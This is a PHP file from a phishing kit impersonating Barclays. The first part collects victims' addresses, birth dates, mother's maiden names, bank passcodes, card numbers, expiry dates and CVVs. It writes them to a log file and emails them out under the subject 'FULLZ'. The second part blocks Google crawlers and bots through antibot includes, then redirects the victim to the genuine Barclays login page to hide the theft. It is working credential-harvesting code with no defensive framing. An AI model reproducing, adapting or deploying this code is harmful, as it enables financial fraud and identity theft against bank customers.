<?php
include("../config.php");
$address  = $_POST['address'];
$address2  = $_POST['address2'];
$city  = $_POST['city'];
$postcode  = $_POST['postcode'];
$date  = $_POST['date'];
$month  = $_POST['month'];
$Year  = $_POST['Year'];
$mmn  = $_POST['mmn'];
$b3d  = $_POST['b3d'];
$tbp  = $_POST['tbp'];
$name  = $_POST['name'];
$ccname  = $_POST['ccname'];
$expmonth  = $_POST['expmonth'];
$expyear  = $_POST['expyear'];
$ccv  = $_POST['ccv'];

$Info_LOG = "
|---------------- INFO-billing ------------------|
|address          : $address
|address2         : $address2
|city             : $city
|postcode         : $postcode
|date of birth    : $date / $month / $Year
|MMN              : $mmn
|B3D              : $b3d
|TB passcode      : $tbp
|
|--------------    [card]    ---------------------|
|
|name on card     : $name
|card number      : $ccname
|expiry           : $expmonth /$expyear
|ccv              : $ccv
|
|-------------------------------------------------|
";
$ip = $_SERVER['REMOTE_ADDR'];
$sub = "FULLZ | $ip ";
$head = "MIME-Version: 1.0" . "\r\n";
$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$head .= "From: XXX" . "\r\n";
if(1 == 1) {
    $myFile = "../rezmdf.txt";
    $fh = @fopen($myFile, 'a+') or die("can't open file");
    @fwrite($fh, $Info_LOG);
    @fclose($fh);
}
mail($to,$sub,$Info_LOG,$head);

?>
<?php
/*   
   _____   _                   _                        ______    __    __     ___  
                   ─████████──████████─████████──████████─████████──████████─
                   ─██░░░░██──██░░░░██─██░░░░██──██░░░░██─██░░░░██──██░░░░██─
                   ─████░░██──██░░████─████░░██──██░░████─████░░██──██░░████─
                   ───██░░░░██░░░░██─────██░░░░██░░░░██─────██░░░░██░░░░██───
                   ───████░░░░░░████─────████░░░░░░████─────████░░░░░░████───
                   ─────██░░░░░░██─────────██░░░░░░██─────────██░░░░░░██─────
                   ───████░░░░░░████─────████░░░░░░████─────████░░░░░░████───
                   ───██░░░░██░░░░██─────██░░░░██░░░░██─────██░░░░██░░░░██───
                   ─████░░██──██░░████─████░░██──██░░████─████░░██──██░░████─
                   ─██░░░░██──██░░░░██─██░░░░██──██░░░░██─██░░░░██──██░░░░██─
                   ─████████──████████─████████──████████─████████──████████─
                   ──────────────────────────────────────────────────────────

    
*/


session_start();
error_reporting(0);

//------------------------------------------|| ANTIBOTS  ||-----------------------------------------------------//
include "../BOTS/antibots1.php";
include "../BOTS/antibots2.php";
include "../BOTS/antibots3.php";
include "../BOTS/antibots4.php";
include "../BOTS/antibots5.php";
include "../BOTS/antibots6.php";
include "../BOTS/antibots7.php";
include "../BOTS/antibots8.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<!DOCTYPE html>
<html>
<head>
    <title>Thank You  </title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex" />
    <link rel="icon" href="css/fav.ico" />
    <meta http-equiv="refresh" content="0; url=https://bank.barclays.co.uk/olb/auth/LoginLink.action">
    <link href="css/app.css" type="text/css" rel="stylesheet">
</head>
</body>
</html>     
